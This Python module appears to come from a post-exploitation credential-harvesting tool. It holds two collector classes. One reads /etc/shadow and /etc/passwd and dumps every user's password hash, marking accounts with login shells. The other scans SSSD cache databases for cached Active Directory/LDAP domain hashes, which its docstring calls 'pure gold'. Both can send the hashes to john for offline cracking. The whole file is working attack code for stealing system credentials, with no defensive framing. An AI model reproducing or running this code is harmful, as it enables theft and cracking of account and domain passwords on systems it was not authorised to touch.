"""System credential stores: /etc/shadow (+passwd) and the SSSD cache.

Shadow: dump every user hash, build the unshadow lines, and (with --crack) crack
them offline via john. SSSD cache: AD/LDAP-joined Linux boxes cache domain
password hashes in /var/lib/sss/db/*.ldb - often overlooked, pure gold."""
from __future__ import annotations

import re
from typing import List

from core.secret import Secret, Status
from core.tools import read_text, read_bytes, is_root, find_files
from core import cracker
from .base import BaseCollector

# $id$...  id: 1=md5crypt 5=sha256 6=sha512 y=yescrypt gy=gost-yescrypt 2a/2b=bcrypt
HASHID = {"1": "md5crypt", "5": "sha256crypt", "6": "sha512crypt",
          "y": "yescrypt", "gy": "gost-yescrypt", "2a": "bcrypt",
          "2b": "bcrypt", "2y": "bcrypt", "7": "scrypt"}
# a locked/empty hash field we never bother with
NO_HASH = ("", "*", "!", "!!", "x")


class ShadowCollector(BaseCollector):
    name = "Shadow"
    description = "/etc/shadow hashes (+passwd) -> unshadow -> optional john crack"
    needs_root = True

    def collect(self) -> List[Secret]:
        shadow = read_text("/etc/shadow")
        passwd = read_text("/etc/passwd") or ""
        if not shadow:
            return []
        shells = {}
        for line in passwd.splitlines():
            p = line.split(":")
            if len(p) >= 7:
                shells[p[0]] = p[6]

        found: List[Secret] = []
        unshadow_lines: List[str] = []
        for line in shadow.splitlines():
            p = line.split(":")
            if len(p) < 2:
                continue
            user, h = p[0], p[1]
            if h in NO_HASH or not h.startswith("$"):
                continue
            alg = h.split("$")[1] if "$" in h else "?"
            htype = HASHID.get(alg, f"crypt-{alg}")
            note = "shadow hash; john/hashcat"
            sh = shells.get(user, "")
            if sh and sh not in ("/usr/sbin/nologin", "/bin/false", "/sbin/nologin"):
                note += "; login shell"
            found.append(Secret("Shadow", user, h, Status.HASH,
                                secret_type=htype, notes=note))
            unshadow_lines.append(f"{user}:{h}")

        if self.crack_enabled and unshadow_lines:
            cracked = cracker.crack(unshadow_lines, self.wordlist)
            for user, pw in cracked.items():
                found.append(Secret("Shadow", user, pw, Status.CRACKED,
                                    secret_type="password",
                                    notes="cracked from shadow"))
        return found


class SssdCollector(BaseCollector):
    name = "SSSD"
    description = "SSSD cached AD/LDAP password hashes (/var/lib/sss/db/*.ldb)"
    needs_root = True

    HASH_RE = re.compile(rb"\$6\$[./A-Za-z0-9]{1,16}\$[./A-Za-z0-9]{86}")
    NAME_RE = re.compile(rb"name=([^,]+),cn=users", re.I)

    def collect(self) -> List[Secret]:
        found: List[Secret] = []
        for f in find_files(["/var/lib/sss/db"], re.compile(r"^cache_.*\.ldb$"),
                            max_depth=2):
            data = read_bytes(f, max_bytes=16 * 1024 * 1024)
            if not data:
                continue
            for m in set(self.HASH_RE.findall(data)):
                h = m.decode("ascii", "ignore")
                found.append(Secret("SSSD", "", h, Status.HASH,
                                    secret_type="sha512crypt", target=f,
                                    notes="cached domain hash; john/hashcat -m 1800"))
            if found and self.crack_enabled:
                lines = [f"sssd{i}:{s.secret}" for i, s in enumerate(found)
                         if s.secret_type == "sha512crypt"]
                cracked = cracker.crack(lines, self.wordlist)
                for pw in cracked.values():
                    found.append(Secret("SSSD", "", pw, Status.CRACKED,
                                        secret_type="password",
                                        notes="cracked SSSD cached hash"))
        return found
